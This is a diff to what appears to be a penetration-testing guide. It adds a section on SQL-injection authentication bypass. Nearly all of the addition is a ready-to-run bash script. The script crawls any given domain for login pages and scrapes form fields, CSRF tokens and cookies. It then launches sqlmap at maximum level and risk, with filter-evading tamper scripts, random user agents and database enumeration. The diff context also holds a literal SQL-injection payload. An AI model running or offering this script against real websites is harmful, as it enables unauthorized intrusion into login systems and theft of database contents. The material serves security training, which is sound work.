@@ -200,6 +200,190 @@ If a 400/500 error appears, modify the payload to `' OR 1=2 --` and submit again
 
 #### SQL Injection (HTML Form Authentication) <a href="#sql-injection-html-form-authentication" id="sql-injection-html-form-authentication"></a>
 
+#### [Katana ](https://github.com/projectdiscovery/katana)& [SQLMap](https://github.com/sqlmapproject/sqlmap)
 
+{% hint style="info" %}
+Create Script
+{% endhint %}
+
+```bash
+sudo nano auth-bypass-sqli.sh
+```
+
+```bash
+#!/bin/bash
+
+# Config & Colors
+RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
+color_print() { printf "${!1}%b${RESET}\n" "$2"; }
+
+# Root Check
+[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }
+
+# Input Check
+if [ $# -lt 1 ]; then
+    echo "Usage: $0 <domain.com>"
+    exit 1
+fi
+
+URL="$1"
+DEPS="git sqlmap"
+
+# Install Katana
+if ! command -v katana &>/dev/null; then
+    color_print GREEN "[*] Installing katana ..."
+    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
+fi
+
+# Install Packages
+for pkg in $DEPS; do
+    if ! dpkg -s "$pkg" &>/dev/null; then
+        color_print YELLOW "[!] Installing $pkg..."
+        apt install -y "$pkg"
+    fi
+done
+
+# Find Login Page
+LOGIN=$(katana -u "$URL" -depth 3 -silent | \
+grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
+grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
+sed 's:[/?]*$::' | sed 's:$:/:')
+
+if [ -z "$LOGIN" ]; then
+    echo "[!] No login page found. Exiting."
+    exit 1
+fi
+
+color_print GREEN "[+] Found login page: $LOGIN"
+
+# Fetch HTML
+HTML=$(curl -s "$LOGIN")
+FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)
+
+# CAPTCHA / reCAPTCHA Check
+CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
+if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
+    color_print YELLOW "[!] CAPTCHA detected on login page. Continuing anyway..."
+fi
+
+# Extract Form Action and Method
+ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
+[ -z "$ACTION" ] && ACTION="$LOGIN"
+
+METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
+[ -z "$METHOD" ] && METHOD="post"
+
+if [[ "$ACTION" == /* ]]; then
+    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
+    FULL_ACTION="${BASE_URL}${ACTION}"
+elif [[ "$ACTION" =~ ^https?:// ]]; then
+    FULL_ACTION="$ACTION"
+else
+    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
+    FULL_ACTION="${BASE_URL}${ACTION}"
+fi
+
+color_print CYAN "[+] Form Action: $FULL_ACTION"
+color_print CYAN "[+] Form Method: $METHOD"
+
+# Extract Username & Password Fields
+USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
+grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
+grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+
+[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
+[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"
+
+color_print CYAN "[+] Username field: $USERNAME_FIELD"
+color_print CYAN "[+] Password field: $PASSWORD_FIELD"
+
+# CSRF Token Extraction
+CSRF_FIELD=""
+CSRF_VALUE=""
+
+HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
+while read -r INPUT; do
+    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
+    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
+    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
+        CSRF_FIELD="$NAME"
+        CSRF_VALUE="$VALUE"
+        break
+    fi
+done <<< "$HIDDEN_INPUTS"
+
+if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
+    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
+    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
+fi
+
+if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
+    color_print CYAN "[+] CSRF field found: $CSRF_FIELD"
+fi
+
+# Extract Cookies
+COOKIES=$(curl -s -I "$LOGIN" \
+  | grep -i '^Set-Cookie:' \
+  | sed -E 's/^Set-Cookie: //I' \
+  | cut -d';' -f1 \
+  | tr '\n' ';' \
+  | sed 's/;$//')
+
+# Extract only domain and port
+HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')
+
+# Prepare data for sqlmap
+if [[ "$METHOD" == "get" ]]; then
+    # For GET requests, sqlmap will use URL parameters
+    SQLMAP_URL="${FULL_ACTION}?${USERNAME_FIELD}=test&${PASSWORD_FIELD}=test"
+    [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && SQLMAP_URL="${SQLMAP_URL}&${CSRF_FIELD}=${CSRF_VALUE}"
+    sqlmap -u "$SQLMAP_URL" \
+        --cookie="$COOKIES" \
+        --batch \
+        --level=3 \
+        --risk=3 \
+        -v 3 \
+        --user-random-agent \
+        --threads=10 \
+        --tamper=space2comment,charencode \
+        --string="dashboard\|welcome\|home\|profile\|logout\|admin" \
+        --not-string="invalid\|incorrect\|failed\|error\|denied" \
+        --dbs \
+        --banner \
+        --current-user \
+        --current-db \
+        --is-dba
+else
+    # For POST requests, prepare data string
+    DATA="${USERNAME_FIELD}=test&${PASSWORD_FIELD}=test"
+    [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
+    sqlmap -u "$FULL_ACTION" \
+        --data="$DATA" \
+        --cookie="$COOKIES" \
+        --batch \
+        --level=3 \
+        --risk=3 \
+        -v 3 \
+        --user-random-agent \
+        --threads=10 \
+        --tamper=space2comment,charencode \
+        --string="dashboard\|welcome\|home\|profile\|logout\|admin" \
+        --not-string="invalid\|incorrect\|failed\|error\|denied" \
+        --dbs \
+        --banner \
+        --current-user \
+        --current-db \
+        --is-dba
+fi
+```
+
+{% hint style="info" %}
+Run Script
+{% endhint %}
+
+```bash
+sudo chmod +x auth-bypass-sqli.sh;sudo ./auth-bypass-sqli.sh $WEBSITE
+```
 
 #### PHP Loose Comparison <a href="#php-loose-comparison" id="php-loose-comparison"></a>
